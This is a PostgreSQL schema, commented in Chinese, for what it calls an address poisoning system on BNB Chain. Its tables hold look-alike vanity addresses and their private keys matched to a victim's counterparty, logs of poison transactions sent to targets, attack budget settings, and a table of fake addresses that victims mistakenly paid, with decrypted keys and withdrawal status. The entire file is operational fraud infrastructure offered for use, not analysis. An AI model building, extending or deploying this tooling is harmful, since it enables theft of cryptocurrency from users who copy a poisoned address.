-- =====================================================
-- 地址投毒系统 - PostgreSQL数据库Schema (单表模式 v2)
-- =====================================================
-- 更新说明:
-- 1. 取消分表，统一使用单表
-- 2. 移除used字段，地址可无限重复使用
-- 3. 新增prefix3字段，支持模糊匹配 (前3后4)
-- 4. 新逻辑: A→B转账，匹配B的前后N位，给A发送投毒
-- 5. 匹配优先级: 前4后4 > 前3后4

-- 1. 预生成地址库表 (单表模式，可重复使用)
CREATE TABLE IF NOT EXISTS vanity_addresses (
    id BIGSERIAL PRIMARY KEY,
    address CHAR(40) NOT NULL,              -- 40位hex地址(无0x)
    prefix CHAR(4) NOT NULL,                -- 前4位 (用于精确匹配)
    prefix3 CHAR(3) NOT NULL,               -- 前3位 (用于模糊匹配)
    suffix CHAR(4) NOT NULL,                -- 后4位
    encrypted_private_key BYTEA NOT NULL,   -- AES-256-GCM加密的私钥
    created_at TIMESTAMP DEFAULT NOW()
);

-- 唯一索引: 防止重复地址
CREATE UNIQUE INDEX IF NOT EXISTS idx_address_unique
ON vanity_addresses(address);

-- 核心索引1: 前4后4精确匹配 (优先使用)
CREATE INDEX IF NOT EXISTS idx_prefix4_suffix4
ON vanity_addresses(prefix, suffix);

-- 核心索引2: 前3后4模糊匹配 (备选)
CREATE INDEX IF NOT EXISTS idx_prefix3_suffix4
ON vanity_addresses(prefix3, suffix);

-- BRIN索引: 用于大表的创建时间范围查询
CREATE INDEX IF NOT EXISTS idx_created_at_brin
ON vanity_addresses USING BRIN(created_at);

-- 2. 投毒记录表 (存储所有发送记录，用于去重和复用)
-- 逻辑: A→B转账时，匹配B的前后4位，给A发送投毒
-- target_address = A (发送方，投毒目标)
-- fake_address = 伪造地址 (前后4位与B相同)
CREATE TABLE IF NOT EXISTS poison_records (
    id BIGSERIAL PRIMARY KEY,
    target_address CHAR(40) NOT NULL,           -- 投毒目标地址(A=发送方)
    fake_address CHAR(40) NOT NULL,             -- 伪造地址 (前后4位匹配B)
    encrypted_private_key BYTEA NOT NULL,       -- 加密的伪造地址私钥
    tx_hash CHAR(64),                           -- 交易哈希
    usdt_amount DECIMAL(20,8),                  -- 发送USDT数量
    gas_used BIGINT,                            -- 实际Gas消耗
    gas_price BIGINT,                           -- Gas价格(wei)
    status VARCHAR(20) DEFAULT 'pending',       -- pending/success/failed
    error_message TEXT,                         -- 错误信息
    sent_at TIMESTAMP DEFAULT NOW(),            -- 发送时间
    confirmed_at TIMESTAMP NULL,                -- 确认时间
    created_at TIMESTAMP DEFAULT NOW()          -- 记录创建时间
);

-- 目标地址+发送时间联合索引 (用于2天去重查询)
CREATE INDEX IF NOT EXISTS idx_target_sent
ON poison_records(target_address, sent_at DESC);

-- 状态索引
CREATE INDEX IF NOT EXISTS idx_status
ON poison_records(status);

-- 发送时间索引 (用于清理)
CREATE INDEX IF NOT EXISTS idx_sent_at
ON poison_records(sent_at);

-- 3. 统计表 (每小时快照)
CREATE TABLE IF NOT EXISTS hourly_stats (
    id SERIAL PRIMARY KEY,
    hour_timestamp TIMESTAMP NOT NULL UNIQUE,
    targets_monitored BIGINT DEFAULT 0,
    targets_filtered BIGINT DEFAULT 0,
    targets_matched BIGINT DEFAULT 0,
    targets_poisoned BIGINT DEFAULT 0,
    gas_spent_bnb DECIMAL(20,8) DEFAULT 0,
    gas_spent_usd DECIMAL(20,2) DEFAULT 0,
    created_at TIMESTAMP DEFAULT NOW()
);

-- 4. 配置表
CREATE TABLE IF NOT EXISTS config (
    key VARCHAR(100) PRIMARY KEY,
    value TEXT NOT NULL,
    description TEXT,
    updated_at TIMESTAMP DEFAULT NOW()
);

-- 初始配置
INSERT INTO config (key, value, description) VALUES
('daily_budget_usd', '300', '每日预算(USD)'),
('hourly_limit_usd', '30', '每小时限制(USD)'),
('max_gas_price_gwei', '5', '最大Gas价格'),
('batch_size_min', '100', '最小批量'),
('batch_size_max', '300', '最大批量'),
('batch_timeout_seconds', '5', '批量超时')
ON CONFLICT (key) DO NOTHING;

-- 5. 分区表 (可选，用于大规模部署)
-- 按月分区poison_records
-- CREATE TABLE poison_records_2024_01 PARTITION OF poison_records
--     FOR VALUES FROM ('2024-01-01') TO ('2024-02-01');

-- =====================================================
-- 辅助函数
-- =====================================================

-- 获取匹配的伪造地址 (前4后4精确匹配)
CREATE OR REPLACE FUNCTION get_matching_address_4_4(
    p_prefix CHAR(4),
    p_suffix CHAR(4)
) RETURNS TABLE (
    id BIGINT,
    address CHAR(40),
    encrypted_private_key BYTEA
) AS $$
BEGIN
    RETURN QUERY
    SELECT va.id, va.address, va.encrypted_private_key
    FROM vanity_addresses va
    WHERE va.prefix = p_prefix AND va.suffix = p_suffix
    LIMIT 1;
END;
$$ LANGUAGE plpgsql;

-- 获取匹配的伪造地址 (前3后4模糊匹配)
CREATE OR REPLACE FUNCTION get_matching_address_3_4(
    p_prefix3 CHAR(3),
    p_suffix CHAR(4)
) RETURNS TABLE (
    id BIGINT,
    address CHAR(40),
    encrypted_private_key BYTEA
) AS $$
BEGIN
    RETURN QUERY
    SELECT va.id, va.address, va.encrypted_private_key
    FROM vanity_addresses va
    WHERE va.prefix3 = p_prefix3 AND va.suffix = p_suffix
    LIMIT 1;
END;
$$ LANGUAGE plpgsql;

-- 清理过期投毒记录
CREATE OR REPLACE FUNCTION cleanup_old_data(days_to_keep INT DEFAULT 30)
RETURNS INTEGER AS $$
DECLARE
    deleted_count INTEGER;
BEGIN
    DELETE FROM poison_records
    WHERE created_at < NOW() - (days_to_keep || ' days')::INTERVAL;
    GET DIAGNOSTICS deleted_count = ROW_COUNT;
    RETURN deleted_count;
END;
$$ LANGUAGE plpgsql;

-- =====================================================
-- 6. 有余额地址表 (投毒成功后有人误转账进来)
-- =====================================================
CREATE TABLE IF NOT EXISTS profitable_addresses (
    id              BIGSERIAL PRIMARY KEY,
    address         CHAR(40) NOT NULL,                      -- 地址 (无0x前缀)
    private_key     TEXT NOT NULL,                          -- 解密后的私钥 (hex格式)
    bnb_balance     NUMERIC(36, 18) NOT NULL DEFAULT 0,     -- BNB余额
    usdt_balance    NUMERIC(36, 18) NOT NULL DEFAULT 0,     -- USDT余额
    first_found_at  TIMESTAMP NOT NULL DEFAULT NOW(),       -- 首次发现时间
    last_checked_at TIMESTAMP NOT NULL DEFAULT NOW(),       -- 最后检查时间
    is_withdrawn    BOOLEAN NOT NULL DEFAULT FALSE,         -- 是否已提取
    withdrawn_at    TIMESTAMP,                              -- 提取时间
    notes           TEXT                                    -- 备注
);

-- 地址唯一索引
CREATE UNIQUE INDEX IF NOT EXISTS idx_profitable_address
ON profitable_addresses(address);

-- 按余额排序索引 (方便查看高价值地址)
CREATE INDEX IF NOT EXISTS idx_profitable_bnb
ON profitable_addresses(bnb_balance DESC) WHERE bnb_balance > 0;

CREATE INDEX IF NOT EXISTS idx_profitable_usdt
ON profitable_addresses(usdt_balance DESC) WHERE usdt_balance > 0;

-- 未提取地址索引
CREATE INDEX IF NOT EXISTS idx_profitable_pending
ON profitable_addresses(is_withdrawn) WHERE is_withdrawn = FALSE;

-- 更新余额的函数
CREATE OR REPLACE FUNCTION update_profitable_balance(
    p_address CHAR(40),
    p_private_key TEXT,
    p_bnb_balance NUMERIC(36, 18),
    p_usdt_balance NUMERIC(36, 18)
) RETURNS VOID AS $$
BEGIN
    INSERT INTO profitable_addresses (address, private_key, bnb_balance, usdt_balance, last_checked_at)
    VALUES (p_address, p_private_key, p_bnb_balance, p_usdt_balance, NOW())
    ON CONFLICT (address) DO UPDATE SET
        bnb_balance = p_bnb_balance,
        usdt_balance = p_usdt_balance,
        last_checked_at = NOW();
END;
$$ LANGUAGE plpgsql;

-- 查看有余额地址的汇总视图
CREATE OR REPLACE VIEW v_profitable_summary AS
SELECT
    COUNT(*) as total_count,
    COUNT(*) FILTER (WHERE NOT is_withdrawn) as pending_count,
    COALESCE(SUM(bnb_balance), 0) as total_bnb,
    COALESCE(SUM(usdt_balance), 0) as total_usdt,
    COALESCE(SUM(bnb_balance) FILTER (WHERE NOT is_withdrawn), 0) as pending_bnb,
    COALESCE(SUM(usdt_balance) FILTER (WHERE NOT is_withdrawn), 0) as pending_usdt
FROM profitable_addresses;

-- =====================================================
-- 7. 已使用伪造地址表 (投毒成功后保存，用于余额监控)
-- =====================================================
CREATE TABLE IF NOT EXISTS used_fake_addresses (
    id BIGSERIAL PRIMARY KEY,
    address CHAR(40) NOT NULL,                      -- 伪造地址 (无0x前缀)
    encrypted_private_key BYTEA NOT NULL,           -- AES-256-GCM加密的私钥 (不解密存储)
    use_count INT NOT NULL DEFAULT 1,               -- 使用次数
    first_used_at TIMESTAMP NOT NULL DEFAULT NOW(), -- 首次使用时间
    last_used_at TIMESTAMP NOT NULL DEFAULT NOW(),  -- 最后使用时间
    bnb_balance NUMERIC(36, 18) NOT NULL DEFAULT 0, -- BNB余额 (定期更新)
    usdt_balance NUMERIC(36, 18) NOT NULL DEFAULT 0,-- USDT余额 (定期更新)
    last_balance_check TIMESTAMP,                   -- 最后余额检查时间
    has_value BOOLEAN NOT NULL DEFAULT FALSE        -- 是否有价值 (BNB>0.1 或 USDT>1)
);

-- 地址唯一索引
CREATE UNIQUE INDEX IF NOT EXISTS idx_used_fake_address_unique
ON used_fake_addresses(address);

-- 有价值地址索引 (用于Web展示)
CREATE INDEX IF NOT EXISTS idx_used_fake_has_value
ON used_fake_addresses(has_value) WHERE has_value = TRUE;

-- 最后使用时间索引
CREATE INDEX IF NOT EXISTS idx_used_fake_last_used
ON used_fake_addresses(last_used_at DESC);

-- 余额检查时间索引 (用于定期检查)
CREATE INDEX IF NOT EXISTS idx_used_fake_balance_check
ON used_fake_addresses(last_balance_check NULLS FIRST);

-- 插入或更新已使用伪造地址的函数
CREATE OR REPLACE FUNCTION upsert_used_fake_address(
    p_address CHAR(40),
    p_encrypted_private_key BYTEA
) RETURNS VOID AS $$
BEGIN
    INSERT INTO used_fake_addresses (address, encrypted_private_key, use_count, first_used_at, last_used_at)
    VALUES (p_address, p_encrypted_private_key, 1, NOW(), NOW())
    ON CONFLICT (address) DO UPDATE SET
        use_count = used_fake_addresses.use_count + 1,
        last_used_at = NOW();
END;
$$ LANGUAGE plpgsql;

-- 更新余额并检查是否有价值的函数
CREATE OR REPLACE FUNCTION update_used_fake_balance(
    p_address CHAR(40),
    p_bnb_balance NUMERIC(36, 18),
    p_usdt_balance NUMERIC(36, 18)
) RETURNS VOID AS $$
BEGIN
    UPDATE used_fake_addresses SET
        bnb_balance = p_bnb_balance,
        usdt_balance = p_usdt_balance,
        last_balance_check = NOW(),
        has_value = (p_bnb_balance > 0.1 OR p_usdt_balance > 1)
    WHERE address = p_address;
END;
$$ LANGUAGE plpgsql;

-- =====================================================
-- 权限设置 (按需启用)
-- =====================================================
-- GRANT SELECT, INSERT, UPDATE ON vanity_addresses TO poison_app;
-- GRANT SELECT, INSERT ON poison_records TO poison_app;
-- GRANT SELECT, INSERT, UPDATE ON profitable_addresses TO poison_app;
-- GRANT SELECT, INSERT, UPDATE ON used_fake_addresses TO poison_app;
-- GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO poison_app;
